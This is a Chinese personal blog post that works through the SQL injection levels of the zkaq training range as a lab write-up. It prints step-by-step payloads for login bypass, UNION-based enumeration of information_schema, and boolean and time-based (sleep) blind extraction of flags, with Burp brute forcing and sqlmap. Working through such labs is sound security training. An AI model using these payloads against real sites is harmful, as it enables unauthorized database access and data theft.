@@ -1,0 +1,453 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" id="meta-theme-color" content="#faf6e9">
+  
+  <title>zkaq-SQL · Yliken</title>
+  <meta name="description" content="红豆藏于南枝深处，红豆藏于南枝深处，相思缠绕心头不息，纵使山河阻隔千里，愿化清风伴君身侧">
+  <script>
+    /* 首帧前即定稿纸色：优先手动选择，否则跟随系统亮暗，避免闪烁 */
+    (function () {
+      var theme = 'day';
+      try {
+        var saved = localStorage.getItem('page-one-paper-theme');
+        if (saved === 'day' || saved === 'night') theme = saved;
+        else if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) theme = 'night';
+      } catch (e) { /* ignore */ }
+      document.documentElement.dataset.theme = theme;
+    })();
+  </script>
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+  <header class="site-header">
+    <div class="container site-header__inner">
+      <a class="brand" href="/" aria-label="回到首页">
+        <span class="brand__mark" aria-hidden="true">页</span>
+        <span class="brand__name">Yliken</span>
+      </a>
+      <nav class="site-nav" aria-label="站点导航">
+        
+          <a class="site-nav__link" href="/">首页</a>
+        
+          <a class="site-nav__link" href="/archives/">归档</a>
+        
+          <a class="site-nav__link" href="/moments/">朋友圈</a>
+        
+          <a class="site-nav__link" href="/memories/">回忆</a>
+        
+          <a class="site-nav__link" href="/reading/">阅读</a>
+        
+          <a class="site-nav__link" href="/yearly-reviews/">年度总结</a>
+        
+          <a class="site-nav__link" href="/link/">友链</a>
+        
+          <a class="site-nav__link" href="/about/">关于</a>
+        
+      </nav>
+      
+      
+        <button class="theme-toggle" type="button" aria-label="切换到夜晚模式" title="切换到夜晚">
+          <span class="theme-toggle__icon" aria-hidden="true">☾</span>
+        </button>
+      
+    </div>
+  </header>
+
+  
+
+  <main class="site-main">
+    <div class="container">
+      
+<article class="post">
+  <header class="post__header">
+    
+      <p class="post__meta">
+        
+          <time class="post__date" datetime="2023-12-04">2023年12月4日</time>
+        
+        
+          <span class="post__readtime">17 分钟</span>
+        
+        
+          <span class="post__tags" aria-label="标签">
+            <a class="tag" href="/tags/zkaq/">#zkaq</a>
+          </span>
+        
+      </p>
+    
+    <h1 class="post__title">zkaq-SQL</h1>
+  </header>
+
+  <div class="post-body markdown-body">
+    <!-- toc -->
+
+<h1 id="post注入"><a href="#post注入" class="headerlink" title="post注入"></a>post注入</h1><p>post传参类型的注入，与get注入很像。<br>post注入经常出现在登录框且通常是字符型。</p>
+<h2 id="靶场演练"><a href="#靶场演练" class="headerlink" title="靶场演练"></a>靶场演练</h2><h3 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">构造&#x27; or 1=1 -- a</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../img/Typora/image-20231203235002355.png" alt="image-20231203235002355"></p>
+<p>成功登录，判断的我们的输入的数据有被当做SQL语句执行。</p>
+<p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or 1=1 order by 3 -- a登录成功</span><br><span class="line">&#x27; or 1=1 order by 4 -- a登录失败</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../img/Typora/image-20231203235507831.png" alt="image-20231203235507831"></p>
+<p><img src="/../img/Typora/image-20231203235522392.png" alt="image-20231203235522392"></p>
+<p>判断页面有三个字段</p>
+<p>暴库名</p>
+<p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;union select 1,2,database() -- a</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/../img/Typora/image-20231203235836781.png" alt="image-20231203235836781"></p>
+<p>暴表名</p>
+<p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;union select 1,2,table_name from information_Schema.tables where table_schema=database() limit 0,1 -- a</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/../img/Typora/image-20231204000043649.png" alt="image-20231204000043649"></p>
+<p>暴字段</p>
+<p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;union select 1,2,column_name from information_Schema.columns where table_schema=database() and table_name=&#x27;flag&#x27; limit 0,1 -- a</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/../img/Typora/image-20231204000233425.png" alt="image-20231204000233425"></p>
+<p>查数据</p>
+<p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;union select 1,2,flag from flag limit 0,1 -- a</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/../img/Typora/image-20231204000318767.png" alt="image-20231204000318767"></p>
+<h3 id="pass-06"><a href="#pass-06" class="headerlink" title="pass-06"></a>pass-06</h3><p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;) or 1=1 -- a</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../img/Typora/image-20231204000459286.png" alt="image-20231204000459286"></p>
+<p>成功登录，判断我们输入的数据能被当做SQL语句执行</p>
+<p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;) or 1=1 order by 3 -- a    //成功登录</span><br><span class="line">&quot;) or 1=1 order by 4 -- a   //登录失败</span><br></pre></td></tr></table></figure>
+
+<p>判断有3个字段</p>
+<p>暴库名</p>
+<p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;) union select 1,2,database() -- a</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/../img/Typora/image-20231204000742714.png" alt="image-20231204000742714"></p>
+<p>暴表名</p>
+<p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;) union select 1,2,table_name from information_schema.tables where table_schema=database() limit 0,1 -- a</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../img/Typora/image-20231204000927928.png" alt="image-20231204000927928"></p>
+<p>暴字段</p>
+<p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;) union select 1,2,column_name from information_schema.columns where table_schema=database() and table_name=&#x27;flag&#x27; limit 1,1 -- a</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../img/Typora/image-20231204001117175.png" alt="image-20231204001117175"></p>
+<p>查数据</p>
+<p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;) union select 1,2,flag from flag limit 1,1-- a</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../img/Typora/image-20231204001316896.png" alt="image-20231204001316896"></p>
+<h2 id="head注入"><a href="#head注入" class="headerlink" title="head注入"></a>head注入</h2><h3 id="pass-07"><a href="#pass-07" class="headerlink" title="pass-07"></a>pass-07</h3><p>俺还不会，先欠着…</p>
+<h3 id="pass-08"><a href="#pass-08" class="headerlink" title="pass-08"></a>pass-08</h3><p>俺还不会，先欠着…</p>
+<h3 id="pass-09"><a href="#pass-09" class="headerlink" title="pass-09"></a>pass-09</h3><p>俺还不会，先欠着…</p>
+<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><h3 id="pass-10"><a href="#pass-10" class="headerlink" title="pass-10"></a>pass-10</h3><p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and 1=1 //页面正常</span><br><span class="line">and 1=2 //报错</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../img/Typora/image-20231205233153710.png" alt="image-20231205233153710"></p>
+<p>页面报错，判断输入的数据能被当做SQL语句执行</p>
+<p>页面无显示位</p>
+<p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and length(database())&gt;11 //页面正常</span><br><span class="line">and length(database())&gt;11 //页面报错，判断数据库名长度为12</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../img/Typora/image-20231205233649115.png" alt="image-20231205233649115"></p>
+<p>爆库名</p>
+<p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and substr(database(),1,1)=&#x27;a&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>并用burp抓包进行爆破</p>
+<p><img src="/../img/Typora/image-20231205234620971.png" alt="image-20231205234620971"></p>
+<p>得到数据库名为’kanwolongxia’</p>
+<p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6 //有一张名称长度为6的表</span><br><span class="line"></span><br><span class="line">and length((select table_name from information_schema.tables where table_schema=database() limit 1,1))=4 //有一张名称长度为4的表</span><br><span class="line"></span><br><span class="line">and length((select table_name from information_schema.tables where table_schema=database() limit 2,1))=4 //有一张名称长度为4的表</span><br></pre></td></tr></table></figure>
+
+
+
+<p>爆表名</p>
+<p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)=&#x27;a&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>并用burp抓包进行爆破</p>
+<p><img src="/../img/Typora/image-20231206001838233.png" alt="image-20231206001838233"></p>
+<p>第一张表的表名为loflag</p>
+<p><img src="/../img/Typora/image-20231206001951983.png" alt="image-20231206001951983"></p>
+<p>第二张表名为news</p>
+<p><img src="/../img/Typora/image-20231206002036712.png" alt="image-20231206002036712"></p>
+<p>第三张表名为user</p>
+<p>爆字段</p>
+<p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and length((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;loflag&#x27; limit 0,1))=2 //有一个名称长度为2的字段</span><br><span class="line"></span><br><span class="line">and length((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;loflag&#x27; limit 1,1))=6 //有一个名称长度为6的字段</span><br></pre></td></tr></table></figure>
+
+<p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;loflag&#x27; limit 0,1),1,1)=&#x27;a&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>并用burp抓包进行爆破	</p>
+<p><img src="/../img/Typora/image-20231206002925181.png" alt="image-20231206002925181"></p>
+<p>第一个字段名是’id’</p>
+<p><img src="/../img/Typora/image-20231206003007462.png" alt="image-20231206003007462"></p>
+<p>第二个字段名是’flaglo’</p>
+<p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and ascii(substr((select flaglo from loflag limit 0,1),1,1))=&#x27;65&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>并用burp抓包爆破</p>
+<p><img src="/../img/Typora/image-20231206003912910.png" alt="image-20231206003912910"></p>
+<p>找到数据zKaQ-QQQ</p>
+<p><img src="/../img/Typora/image-20231206004101515.png" alt="image-20231206004101515"></p>
+<h3 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h3><p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot; and 1=1 -- a&quot; //有数据</span><br><span class="line">&quot; and 1=2 -- a&quot; //无数据</span><br></pre></td></tr></table></figure>
+
+<p>判断输入的数据能被当做SQL语句执行</p>
+<p>判断数据库名字长度</p>
+<p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; and length(database())=12 -- a&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../img/Typora/image-20231206123240728.png" alt="image-20231206123240728"></p>
+<p>有数据，判断数据库名称长度为12</p>
+<p>爆库名</p>
+<p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;and substr(database(),1,1)=&#x27;a&#x27; -- a</span><br></pre></td></tr></table></figure>
+
+<p>并用burp抓包，进行爆破</p>
+<p><img src="/../img/Typora/image-20231206123556427.png" alt="image-20231206123556427"></p>
+<p>的到数据库库名”kanwolongxia“</p>
+<p>爆表明</p>
+<p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6 -- a //有一张名称长度为6的表</span><br><span class="line"></span><br><span class="line">&quot;and length((select table_name from information_schema.tables where table_schema=database() limit 1,1))=4 -- a//有一张名称长度为4的表</span><br><span class="line"></span><br><span class="line">&quot;and length((select table_name from information_schema.tables where table_schema=database() limit 2,1))=4 -- a //有一张名称长度为4的表</span><br></pre></td></tr></table></figure>
+
+<p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)=&#x27;a&#x27; -- a</span><br></pre></td></tr></table></figure>
+
+<p>并用burp 抓包爆破</p>
+<p><img src="/../img/Typora/image-20231206124110515.png" alt="image-20231206124110515"></p>
+<p>第一张表名为“loflag”</p>
+<p><img src="/../img/Typora/image-20231206124214529.png" alt="image-20231206124214529"></p>
+<p>第二张表名为“news”</p>
+<p><img src="/../img/Typora/image-20231206124300048.png" alt="image-20231206124300048"></p>
+<p>第三张表名为“user”</p>
+<p>查字段</p>
+<p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;and length((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;loflag&#x27; limit 0,1))=2 -- a //有一个名称长度为2的字段</span><br><span class="line"></span><br><span class="line">&quot;and length((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;loflag&#x27; limit 1,1))=6 -- a //有一个名称长度为6的字段</span><br></pre></td></tr></table></figure>
+
+<p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;and substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;loflag&#x27; limit 0,1),1,1)=&#x27;a&#x27; -- a</span><br></pre></td></tr></table></figure>
+
+<p>并用burp抓包，爆破字段名</p>
+<p><img src="/../img/Typora/image-20231206125306285.png" alt="image-20231206125306285"></p>
+<p>第一个字段是“id”</p>
+<p><img src="/../img/Typora/image-20231206125402336.png" alt="image-20231206125402336"></p>
+<p>第二个字段是“flaglo”</p>
+<p>查数据</p>
+<p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;and ascii(substr((select flaglo from loflag limit 0,1),1,1))=&#x27;65&#x27; -- a //查询flaglo字段下的内容</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../img/Typora/image-20231206130055005.png" alt="image-20231206130055005"></p>
+<p>查到数据zKaQ RD 加上缺少的5则flag为“zKaQ-RD”</p>
+<p><img src="/../img/Typora/image-20231206130259500.png" alt="image-20231206130259500"></p>
+<p>flag正确</p>
+<h3 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h3><p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or 1=1 -- a //登录成功</span><br><span class="line">&#x27; or 1=2 -- a //登录失败</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../img/Typora/image-20231206221540631.png" alt="image-20231206221540631"></p>
+<p>判断输入的数据可以被当作SQL语句执行</p>
+<p>判断数据库名称长度</p>
+<p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or length(database())=12 -- a //登录成功，判断数据库名长度为12</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/../img/Typora/image-20231206222358123.png" alt="image-20231206222358123"></p>
+<p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or substr(database(),1,1)=&#x27;a&#x27; -- a </span><br></pre></td></tr></table></figure>
+
+<p>并用burp抓包，爆破出数据库名字</p>
+<p><img src="/../img/Typora/image-20231206223212526.png" alt="image-20231206223212526"></p>
+<p>数据库名为”kanwolongxia“</p>
+<p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6 -- a //有一张名称长度为6的表</span><br><span class="line"></span><br><span class="line">&#x27;or length((select table_name from information_schema.tables where table_schema=database() limit 1,1))=4 -- a //有一张长度为4的表</span><br><span class="line"></span><br><span class="line">&#x27;or length((select table_name from information_schema.tables where table_schema=database() limit 2,1)) =4-- a //有一张长度为4的表</span><br></pre></td></tr></table></figure>
+
+<p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)=&#x27;a&#x27; -- a//</span><br></pre></td></tr></table></figure>
+
+<p>并用burp抓包，进行爆破</p>
+<p><img src="/../img/Typora/image-20231206224604721.png" alt="image-20231206224604721"></p>
+<p>第一张表的名字为‘lofalg’</p>
+<p><img src="/../img/Typora/image-20231206224703621.png" alt="image-20231206224703621"></p>
+<p>第二张表的名字为‘news’</p>
+<p><img src="/../img/Typora/image-20231206224747069.png" alt="image-20231206224747069"></p>
+<p>第三张表的名字为‘user’</p>
+<p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or length((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;loflag&#x27; limit 0,1))=2 -- a //有一个名称长度为2的字段</span><br><span class="line">&#x27;or length((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;loflag&#x27; limit 1,1))=6 -- a //有一个名称长度为6的字段</span><br></pre></td></tr></table></figure>
+
+<p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;loflag&#x27; limit 0,1),1,1)=&#x27;a&#x27; -- a</span><br></pre></td></tr></table></figure>
+
+<p>并用burp爆破</p>
+<p><img src="/../img/Typora/image-20231206225428949.png" alt="image-20231206225428949"></p>
+<p>第一个字段名是‘id’</p>
+<p><img src="/../img/Typora/image-20231206225532188.png" alt="image-20231206225532188"></p>
+<p>第一个字段名是‘flaglo’</p>
+<p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or length((select flaglo from loflag limit 2,1))=10 -- a&#x27; //登录成功</span><br></pre></td></tr></table></figure>
+
+<p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or ascii(substr((select flaglo from loflag limit 0,1),2,1))=&#x27;65&#x27; -- a //查询flaglo字段下的内容</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../img/Typora/image-20231206231110402.png" alt="image-20231206231110402"></p>
+<p>得到内容’zKaQMoren’则flag为”zKaQ-Moren“</p>
+<p><img src="/../img/Typora/image-20231206231329877.png" alt="image-20231206231329877"></p>
+<h3 id="Pass-10-12总结"><a href="#Pass-10-12总结" class="headerlink" title="Pass-10~12总结"></a>Pass-10~12总结</h3><p>Pass-10、Pass-11、Pass-12三题库名一样，表名一样，字段名一样、flaglo字段下面存放的三个flag分别对应Pass-10、Pass-11、Pass-12三题</p>
+<h2 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h2><h3 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h3><p>url后面拼接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;and sleep(5) -- a //页面反应有延时，判断存在时间注入</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../img/Typora/image-20231212195317179.png" alt="image-20231212195317179"></p>
+<p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;and if(length(database())=12,sleep(5),1) -- a //页面反映有延时，判断数据库名称长度为12</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../img/Typora/image-20231222235927425.png" alt="image-20231222235927425"></p>
+<p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;and if(substr(database(),1,1)=&#x27;k&#x27;,sleep(5),1) -- a</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../img/Typora/image-20231223000414528.png" alt="image-20231223000414528"></p>
+<p>bp爆破得到库名为’kanwolongxia’</p>
+<p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;and if(length((select table_name from information_schema.tables where table_schema = database() limit 0,1))=6,sleep(5),1) -- a&quot;//页面延时，判断有一个表名长度为6</span><br><span class="line">&quot;and if(length((select table_name from information_schema.tables where table_schema = database() limit 1,1))=6,sleep(5),1) -- a&quot;//页面延时，判断有一个表名长度为6</span><br><span class="line">&quot;and if(length((select table_name from information_schema.tables where table_schema = database() limit 1,1))=6,sleep(5),1) -- a&quot;//页面延时，判断有一个表名长度为4</span><br></pre></td></tr></table></figure>
+
+<p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;and if(substr((select table_name from information_schema.tables where table_schema = database() limit 0,1),1,1)=&#x27;a&#x27;,sleep(5),1) -- a&quot;</span><br></pre></td></tr></table></figure>
+
+<p>bp爆破</p>
+<p><img src="/../img/Typora/image-20231223003142468.png" alt="image-20231223003142468"></p>
+<p>得到三个表名分别为‘loflag’、‘news’、‘uesr’</p>
+<p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;and if(length((select column_name from information_schema.columns where table_schema = database() and table_name=&#x27;loflag&#x27; limit 0,1))=2,sleep(5),1) -- a&quot; //页面延时，有一个长度为2的字段</span><br><span class="line">&quot;and if(length((select column_name from information_schema.columns where table_schema = database() and table_name=&#x27;loflag&#x27; limit 1,1))=6,sleep(5),1) -- a&quot; //页面延时，有一个长度为6的字段</span><br></pre></td></tr></table></figure>
+
+<p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;and if(substr((select column_name from information_schema.columns where table_schema = database() and table_name = &#x27;loflag&#x27; limit 0,1),1,1)=&#x27;a&#x27;,sleep(5),1) -- a&quot;</span><br></pre></td></tr></table></figure>
+
+<p>bp爆破</p>
+<p><img src="/../img/Typora/image-20231223004153658.png" alt="image-20231223004153658"></p>
+<p>两个字段分别为‘id’、‘flaglo’</p>
+<p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">构造&quot;and if(ascii(substr((select flaglo from loflag limit 0,1),1,1))=122,sleep(5),1) -- a&quot;&quot;</span><br></pre></td></tr></table></figure>
+<p>bp爆破</p>
+<p><img src="/../img/Typora/image-20231223011646366.png" alt="image-20231223011646366"></p>
+<p>得到’zKaQ QQQ’则flag为‘zKaQQQ’</p>
+<p><img src="/../img/Typora/image-20231223111344205.png" alt="image-20231223111344205"></p>
+<p>得到‘zKaQ-RD’</p>
+<p><img src="/../img/Typora/image-20231223111630621.png" alt="image-20231223111630621"></p>
+<p>得到‘zKaQ-Moren’</p>
+<p><img src="/../img/Typora/image-20231223111902301.png" alt="image-20231223111902301"></p>
+<p>得到‘zKaQ-time-hj’</p>
+<p><img src="/../img/Typora/image-20231223112055645.png" alt="image-20231223112055645"></p>
+<p>得到‘zKaQ-time-zxxz’</p>
+<h3 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h3><p>Pass-14与Pass-13只有闭合方式不同，其他的都相同</p>
+<p>这里我就偷懒用sqlmap跑了<img src="../img/Typora/weiqu.gif" alt="img" style="zoom:50%;" /></p>
+<p>爆库名</p>
+<p><img src="/../img/Typora/image-20231223114131511.png" alt="image-20231223114131511"></p>
+<p>爆表名</p>
+<p><img src="/../img/Typora/image-20231223114322422.png" alt="image-20231223114322422"></p>
+<p>爆字段</p>
+<p><img src="/../img/Typora/image-20231223114733870.png" alt="image-20231223114733870"></p>
+<p>查数据</p>
+<p><img src="/../img/Typora/image-20231223115527232.png" alt="image-20231223115527232"></p>
+
+  </div>
+
+  
+    <nav class="post-toc" id="post-toc" aria-label="文章目录"></nav>
+  
+
+  
+    <footer class="post__license">
+      <span class="post__license-author">Yliken</span>
+      <span class="post__license-sep" aria-hidden="true">·</span>
+      <a class="post__license-link" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a>
+    </footer>
+  
+</article>
+
+
+  <section class="related" aria-label="相关阅读">
+    <h2 class="related__title">相关阅读</h2>
+    <ul class="related__list">
+      
+        <li class="related__item">
+          <time class="related__date" datetime="2024-03-06">2024·03·06</time>
+          <a class="related__link" href="/2024/03/06/%E5%9F%BA%E7%A1%80/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/">正则表达式</a>
+        </li>
+      
+        <li class="related__item">
+          <time class="related__date" datetime="2024-03-05">2024·03·05</time>
+          <a class="related__link" href="/2024/03/05/%E5%9F%BA%E7%A1%80/SSIT%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">SSTI模板注入</a>
+        </li>
+      
+        <li class="related__item">
+          <time class="related__date" datetime="2024-03-04">2024·03·04</time>
+          <a class="related__link" href="/2024/03/04/%E5%9F%BA%E7%A1%80/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">zkaq-代码执行</a>
+        </li>
+      
+    </ul>
+  </section>
+
+
+
+  <nav class="post-nav" aria-label="相邻文章">
+    
+      <a class="post-nav__link post-nav__link--prev" href="/2023/12/22/%E5%9F%BA%E7%A1%80/upload/">
+        <span class="post-nav__dir">← 上一篇</span>
+        <span class="post-nav__title">zkaq-upload-labs</span>
+      </a>
+    
+    
+  </nav>
+
+
+    </div>
+  </main>
+
+  
+
+  
+  <footer class="site-footer">
+    <div class="container site-footer__inner">
+      
+      <p class="site-footer__copy">
+        © 2026 Yliken
+      </p>
+      
+        <p class="site-footer__motto">在技术里较真，也在生活里留白。</p>
+      
+      
+        <p class="site-footer__powered">Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> · <span class="site-footer__theme">Page One</span></p>
+      
+    </div>
+    
+  </footer>
+  
+<script src="/js/theme.js"></script>
+
+  
+  
+</body>
+</html>
